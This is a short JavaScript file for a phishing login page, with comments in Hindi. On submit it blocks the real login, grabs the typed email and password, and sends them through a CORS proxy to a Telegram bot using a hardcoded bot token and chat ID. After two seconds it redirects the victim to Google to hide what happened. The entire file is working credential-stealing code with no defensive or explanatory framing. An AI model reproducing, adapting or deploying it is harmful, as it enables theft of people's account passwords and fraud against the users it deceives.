document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const botToken = "6717477751:AAG6phDMwqdQiKFN6n3_28Fp51NmRvmuCsg";
    const chatId = "7732354688";
    
    const proxyUrl = "https://corsproxy.io/?";
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const message = `Login Attempt!\nEmail: ${email}\nPassword: ${password}`;

    // डेटा भेजना शुरू करें
    fetch(proxyUrl + encodeURIComponent(telegramUrl), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    });

    // 2 सेकंड रुकें फिर गूगल पर भेजें (ताकि मैसेज पहुँच जाए)
    setTimeout(function() {
        window.location.href = "https://www.google.com";
    }, 2000); 
});
